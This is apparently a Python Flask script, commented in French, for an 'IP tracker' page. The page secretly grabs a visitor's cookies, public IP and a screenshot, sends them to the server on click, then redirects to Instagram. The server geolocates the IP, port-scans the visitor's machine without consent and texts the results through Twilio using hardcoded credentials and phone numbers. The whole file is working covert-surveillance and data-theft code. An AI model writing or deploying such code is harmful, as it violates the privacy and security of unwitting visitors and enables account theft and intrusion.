from flask import Flask, request, jsonify
from twilio.rest import Client
import requests
import socket

app = Flask(__name__)

# Twilio credentials
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

# 🔍 Géolocalisation IP
def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
    except:
        return "Localisation impossible"

# 🔓 Scan des ports courants
def scan_ports(ip, ports=[21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 8080]):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            continue
    return open_ports

# 📩 Envoi SMS via Twilio
def send_sms(ip, user_agent, cookies, screenshot, click_x, click_y):
    location = get_geolocation(ip)
    ports = scan_ports(ip)

    message_body = f"""
[IP TRACKER - INFOS]
IP publique : {ip}
Localisation : {location}
Ports ouverts : {ports if ports else 'Aucun trouvé'}
User-Agent : {user_agent}
Cookies : {cookies}
Clic détecté à : ({click_x}, {click_y})
Capture écran (début base64) : {screenshot[:50]}...
    """
    try:
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur envoi SMS : {e}")

# 🖼️ Page principale HTML avec script de tracking
@app.route('/')
def index():
    return '''
    <html>
    <head><title>Redirection</title></head>
    <body>
        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
        <script>
            const cookies = document.cookie;

            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                html2canvas(document.body).then(canvas => {
                    const screenshot = canvas.toDataURL();

                    document.body.addEventListener('click', function(event) {
                        fetch("/log", {
                            method: "POST",
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                ip: data.ip,
                                ua: navigator.userAgent,
                                cookies: cookies,
                                screenshot: screenshot,
                                click_x: event.pageX,
                                click_y: event.pageY
                            })
                        }).then(() => {
                            window.location.href = "https://www.instagram.com";
                        });
                    });
                });
            });
        </script>
    </body>
    </html>
    '''

# 🔐 Endpoint de réception des données
@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    cookies = data.get('cookies')
    screenshot = data.get('screenshot')
    click_x = data.get('click_x')
    click_y = data.get('click_y')

    send_sms(ip, user_agent, cookies, screenshot, click_x, click_y)

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
